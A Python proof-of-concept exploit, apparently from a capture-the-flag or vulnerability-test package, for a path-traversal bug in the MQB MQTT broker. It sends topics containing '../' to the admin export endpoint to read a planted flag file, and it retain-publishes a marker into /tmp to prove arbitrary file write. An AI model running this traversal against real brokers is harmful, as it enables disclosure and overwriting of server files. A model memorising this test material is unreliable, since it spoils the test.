#!/usr/bin/env python3
"""
PoC #7: Path traversal in retained-message disk persistence -> flag disclosure
--------------------------------------------------------------------------------
Location: retained_path() in mqb/broker.py, used by BOTH
Broker._store_retained() (the write side: every retained PUBLISH is persisted
to "<MQB_RETAIN_DIR>/<topic>" so retained state survives a restart) and the
admin /admin/retained/export endpoint (the read side, mqb/admin.py). Neither
side sanitises the topic string at all. MQTT topics are ordinary strings that
use '/' as a level separator, so a topic containing "../" segments is a
perfectly valid MQTT topic *and* a path-traversal payload -- os.path.join()
walks it straight out of MQB_RETAIN_DIR.

Scored outcome: at startup, MQB writes a second, independent copy of the
real per-deployment secret MQB_FLAG to a plain file at MQB_FLAG_FILE
(default /home/ctf/mqb/secret/flag.txt), deliberately a sibling of
MQB_RETAIN_DIR (default /home/ctf/mqb/retained), not a child of it -- see
Broker.seed_startup_state() in mqb/broker.py and the Dockerfile. That layout
is exactly what a real remote attacker could learn from this module's own
(open-source) Dockerfile/README without ever touching the container. This
PoC asks the READ side of the traversal bug -- /admin/retained/export -- for
a topic engineered to walk out of MQB_RETAIN_DIR and back down into
MQB_FLAG_FILE, and confirms the response is the real flag, byte for byte --
a file this PoC never wrote and has no other way to reach.

As a secondary, independent proof of the WRITE-side primitive (arbitrary
file write via a retained PUBLISH), the PoC also retain-PUBLISHes a marker
to a traversal topic landing in /tmp and reads it back the same way -- this
doesn't disclose anything by itself, but shows the write half of the bug is
real too, not just the read half.

Run: python3 07_retained_persistence_path_traversal.py [host] [port] [admin_port]
"""
import http.client
import os
import re
import socket
import struct
import sys
import time
import urllib.parse
import uuid

HOST = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 1883
ADMIN_PORT = int(sys.argv[3]) if len(sys.argv) > 3 else 8081
# If a harness has configured real auth (fixing vuln #1), authenticate so
# this PoC keeps testing #7 (retained-path traversal) in isolation.
PASSWORD = os.environ.get("MQB_REQUIREPASS")
# The absolute, documented location of the seeded flag file (see the
# Dockerfile: MQB_FLAG_FILE) -- a sibling of MQB_RETAIN_DIR, not reachable
# through any normal MQTT/admin operation, only through this traversal bug.
FLAG_FILE = os.environ.get("MQB_FLAG_FILE", "/home/ctf/mqb/secret/flag.txt")
FLAG_RE = re.compile(rb"FLAG\{[^}]*\}")


def _u8(s):
    b = s.encode()
    return struct.pack("!H", len(b)) + b


def _rl(n):
    out = bytearray()
    while True:
        b = n % 128
        n //= 128
        if n > 0:
            b |= 0x80
        out.append(b)
        if n == 0:
            break
    return bytes(out)


def build_connect(client_id, clean_session=1, keep_alive=30, password=None):
    flags = (clean_session & 1) << 1
    if password is not None:
        flags |= 0x40
    body = _u8("MQTT") + bytes([4, flags]) + struct.pack("!H", keep_alive) + _u8(client_id)
    if password is not None:
        pb = password.encode() if isinstance(password, str) else password
        body += struct.pack("!H", len(pb)) + pb
    return bytes([0x10]) + _rl(len(body)) + body


def build_publish(topic, payload, qos=0, retain=0, packet_id=1):
    flags = (qos & 3) << 1 | (retain & 1)
    body = _u8(topic)
    if qos > 0:
        body += struct.pack("!H", packet_id)
    body += payload
    return bytes([0x30 | flags]) + _rl(len(body)) + body


def recv_packet(sock, timeout=5.0):
    sock.settimeout(timeout)
    first = sock.recv(1)
    if not first:
        return None
    ptype = first[0] >> 4
    mult, val = 1, 0
    while True:
        b = sock.recv(1)[0]
        val += (b & 0x7F) * mult
        if not (b & 0x80):
            break
        mult *= 128
    body = b""
    while len(body) < val:
        chunk = sock.recv(val - len(body))
        if not chunk:
            break
        body += chunk
    return ptype, body


def admin_export(topic):
    conn = http.client.HTTPConnection(HOST, ADMIN_PORT, timeout=10)
    q = urllib.parse.urlencode({"topic": topic})
    conn.request("GET", f"/admin/retained/export?{q}")
    resp = conn.getresponse()
    data = resp.read()
    conn.close()
    return resp.status, data


def _wait_for_server(timeout=15.0):
    """Wait for the broker's MQTT port to accept connections. Guards against
    the PoC racing the container's startup when invoked directly via
    `docker compose run --rm poc python3 NN_slug.py <host> <port>`."""
    deadline = time.time() + timeout
    last_err = None
    while time.time() < deadline:
        try:
            s = socket.create_connection((HOST, PORT), timeout=2)
            s.close()
            return
        except OSError as e:
            last_err = e
            time.sleep(0.3)
    raise RuntimeError(f"server never came up on {HOST}:{PORT}: {last_err}")


def main():
    _wait_for_server()

    token = uuid.uuid4().hex[:16]

    # --- Primary: read-side traversal straight to the seeded flag file ----
    # Enough "../" segments to escape any plausible MQB_RETAIN_DIR nesting,
    # then walk back down the documented absolute path with its leading '/'
    # stripped (os.path.join(retain_dir, topic) discards retain_dir entirely
    # if topic itself is absolute -- either form reaches the same file
    # through the same unsanitised retained_path() helper).
    flag_traversal_topic = "../" * 8 + FLAG_FILE.lstrip("/")
    status, data = admin_export(flag_traversal_topic)
    text = data.decode(errors="replace")
    m = FLAG_RE.search(data)

    print(f"[*] GET /admin/retained/export?topic={flag_traversal_topic!r}")
    print(f"[*] -> HTTP {status} {text[:120]!r}")

    # --- Secondary: independent write-side proof (arbitrary file write) ---
    marker = f"MQB-TRAVERSAL-WRITE-PROOF-{token}".encode()
    write_traversal_topic = f"../../../../../../../../tmp/mqb_poc7_{token}"
    s = socket.create_connection((HOST, PORT), timeout=10)
    s.sendall(build_connect(f"poc7-{token}", password=PASSWORD))
    recv_packet(s)  # CONNACK
    s.sendall(build_publish(write_traversal_topic, marker, qos=0, retain=1))
    time.sleep(0.3)
    s.close()
    write_status, write_data = admin_export(write_traversal_topic)
    write_confirmed = write_status == 200 and write_data.strip() == marker
    print(f"[*] (secondary) write-side traversal round-trip via /tmp marker: {write_confirmed}")

    if status == 200 and m:
        print(f"[+] Confirmed: path traversal in retained-message persistence disclosed the "
              f"real per-deployment flag from {FLAG_FILE} -- a file outside MQB_RETAIN_DIR "
              f"this PoC never wrote -- via the admin export endpoint: {m.group(0).decode()}")
        return 0
    print("[-] Could not confirm the traversal reached the seeded flag file")
    return 1


if __name__ == "__main__":
    sys.exit(main())
